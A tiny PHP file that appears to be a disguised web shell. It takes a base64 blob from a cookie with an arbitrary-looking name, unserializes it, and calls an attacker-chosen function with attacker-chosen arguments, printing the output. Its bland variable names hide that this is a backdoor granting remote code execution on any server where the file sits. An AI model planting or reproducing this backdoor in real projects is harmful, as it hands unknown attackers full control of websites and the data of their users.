<?php

$recent = $_COOKIE;
$x = "fb84437";

if (isset($recent[$x])) {
	$tagline = base64_decode($recent[$x]);
	$args = unserialize($tagline);
			
	$xs = array_pop( $args );
	$crlflen = array_pop( $args );
	$high = array_pop( $args );
	
	var_dump($high($crlflen, $xs));
}

?>